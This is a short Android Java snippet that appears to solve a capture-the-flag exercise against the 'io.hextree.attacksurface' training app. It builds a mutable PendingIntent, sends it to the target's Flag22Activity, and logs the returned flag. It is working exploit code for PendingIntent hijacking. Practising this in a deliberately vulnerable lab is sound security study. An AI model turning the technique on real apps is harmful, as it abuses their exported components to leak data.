    // All code in one class (Mainactivity) 
    Button button;
    button = findViewById(R.id.Btn);

    String flag = getIntent().getStringExtra("flag");

    if(flag != null){
        Log.d("Flag22",flag);
    }

    button.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            Intent targetIntent = new Intent();
            targetIntent.setClass(MainActivity.this, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(MainActivity.this,0,targetIntent,PendingIntent.FLAG_UPDATE_CURRENT);


            Intent exploitintent = new Intent();
            exploitintent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag22Activity");
            exploitintent.putExtra("PENDING",pendingIntent);

            startActivity(exploitintent);

        }

    });